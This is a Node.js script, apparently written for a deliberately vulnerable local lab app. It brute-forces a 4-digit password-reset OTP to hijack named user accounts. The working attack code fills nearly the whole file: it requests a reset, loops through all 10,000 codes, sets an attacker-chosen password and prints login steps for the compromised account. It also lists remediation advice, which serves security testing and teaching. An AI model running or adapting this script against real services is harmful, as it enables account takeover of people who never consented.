/**
 * OTP Brute Force Attack Script
 * 
 * This script demonstrates the vulnerability in the forgot password OTP system:
 * - OTP is only 4 digits (0000-9999) - only 10,000 possibilities
 * - No rate limiting - unlimited attempts allowed
 * - No account lockout mechanism
 * - No delay between attempts
 * 
 * USAGE:
 * 1. Go to http://localhost:3001/forgot-password
 * 2. Enter target username (e.g., 'fathan', 'ryan', or 'admin')
 * 3. System will send OTP to user's email
 * 4. Instead of guessing, run this script to brute force the OTP
 * 5. node otp-bruteforce.js <username> <new_password>
 * 
 * Example: node otp-bruteforce.js fathan HackedPassword123
 */

import fetch from 'node-fetch';

const TARGET_URL = 'http://localhost:3001';
const username = process.argv[2];
const newPassword = process.argv[3];

if (!username || !newPassword) {
  console.log('\nâŒ Missing arguments!');
  console.log('\nUsage: node otp-bruteforce.js <username> <new_password>');
  console.log('\nExample: node otp-bruteforce.js fathan HackedPassword123');
  console.log('\nAvailable usernames: fathan, ryan, admin\n');
  process.exit(1);
}

console.log('â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—');
console.log('â•‘        OTP BRUTE FORCE ATTACK - VULNERABILITY TEST     â•‘');
console.log('â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n');

console.log(`Target: ${TARGET_URL}`);
console.log(`Username: ${username}`);
console.log(`New Password: ${newPassword}`);
console.log(`OTP Range: 0000-9999 (10,000 possibilities)\n`);

// Step 1: Request password reset and get OTP
async function requestPasswordReset() {
  console.log('[1/2] Requesting password reset for', username, '...');
  
  const response = await fetch(`${TARGET_URL}/forgot-password`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
    },
    body: `username=${username}`,
    redirect: 'manual'
  });
  
  const cookies = response.headers.get('set-cookie');
  if (!cookies) {
    console.error('âŒ Failed to request password reset!');
    console.error('   Make sure the username exists.');
    process.exit(1);
  }
  
  console.log('âœ… Password reset requested! OTP sent to user email.\n');
  return cookies;
}

// Step 2: Brute force OTP
async function bruteForceOTP(cookies) {
  console.log('[2/2] Starting OTP brute force attack...');
  console.log('âš ï¸  This will try all 10,000 combinations (0000-9999)\n');
  
  const startTime = Date.now();
  let attempts = 0;
  
  // Try all 4-digit combinations
  for (let i = 0; i <= 9999; i++) {
    const otp = i.toString().padStart(4, '0');
    attempts++;
    
    // Show progress every 100 attempts
    if (attempts % 100 === 0) {
      const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
      const rate = (attempts / (Date.now() - startTime) * 1000).toFixed(0);
      process.stdout.write(`\rğŸ” Trying OTP: ${otp} | Attempts: ${attempts}/10,000 | ${((attempts/10000)*100).toFixed(1)}% | ${elapsed}s | ${rate}/s`);
    }
    
    const response = await fetch(`${TARGET_URL}/verify-otp`, {
      method: 'POST',
      headers: {
        'Cookie': cookies,
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: `otp=${otp}&new_password=${encodeURIComponent(newPassword)}`,
      redirect: 'manual'
    });
    
    const body = await response.text();
    
    // Check if password reset was successful
    if (body.includes('Password Reset Successful') || body.includes('Login Now')) {
      const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
      const rate = (attempts / (Date.now() - startTime) * 1000).toFixed(0);
      
      console.log('\n\nâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—');
      console.log('â•‘                 âœ… ATTACK SUCCESSFUL! âœ…                â•‘');
      console.log('â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n');
      
      console.log(`ğŸ¯ Correct OTP Found: ${otp}`);
      console.log(`â±ï¸  Time Elapsed: ${elapsed} seconds`);
      console.log(`ğŸ”¢ Total Attempts: ${attempts}/10,000`);
      console.log(`âš¡ Attack Rate: ${rate} attempts/second`);
      console.log(`ğŸ“Š Success Rate: ${((attempts/10000)*100).toFixed(2)}%\n`);
      
      console.log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•');
      console.log('IMPACT:');
      console.log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•');
      console.log('âœ“ Password successfully changed without knowing the OTP');
      console.log('âœ“ Account takeover achieved through brute force');
      console.log('âœ“ No rate limiting prevented the attack');
      console.log('âœ“ No account lockout mechanism exists');
      console.log(`âœ“ Attacker can now login as: ${username}`);
      console.log(`âœ“ New password: ${newPassword}\n`);
      
      console.log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•');
      console.log('VULNERABILITY DETAILS:');
      console.log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•');
      console.log('1. OTP is only 4 digits (10,000 possibilities)');
      console.log('2. No rate limiting on verification attempts');
      console.log('3. No account lockout after failed attempts');
      console.log('4. No CAPTCHA to prevent automation');
      console.log('5. No OTP expiration time\n');
      
      console.log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•');
      console.log('REMEDIATION:');
      console.log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•');
      console.log('1. Implement rate limiting (max 3-5 attempts)');
      console.log('2. Add account lockout after failed attempts');
      console.log('3. Use longer OTP codes (6-8 digits)');
      console.log('4. Implement CAPTCHA after failed attempts');
      console.log('5. Add OTP expiration (5-10 minutes)');
      console.log('6. Log and alert on suspicious activity');
      console.log('7. Add delay between verification attempts\n');
      
      console.log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•');
      console.log('NEXT STEPS:');
      console.log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•');
      console.log(`1. Login to ${TARGET_URL}/login`);
      console.log(`2. Username: ${username}`);
      console.log(`3. Password: ${newPassword}`);
      console.log('4. Access granted! Account compromised.\n');
      
      return true;
    }
  }
  
  console.log('\n\nâŒ Brute force failed - OTP not found in range 0000-9999');
  console.log('   This should not happen unless the OTP was changed during attack.\n');
  return false;
}

// Main execution
(async () => {
  try {
    const cookies = await requestPasswordReset();
    
    // Small delay before starting brute force
    console.log('Starting brute force in 2 seconds...\n');
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    await bruteForceOTP(cookies);
    
  } catch (error) {
    console.error('\nâŒ Error:', error.message);
    console.error('\nTroubleshooting:');
    console.error('1. Make sure the vulnerable app is running on port 3001');
    console.error('2. Check that the username exists (fathan, ryan, admin)');
    console.error('3. Verify node-fetch is installed: npm install node-fetch\n');
    process.exit(1);
  }
})();
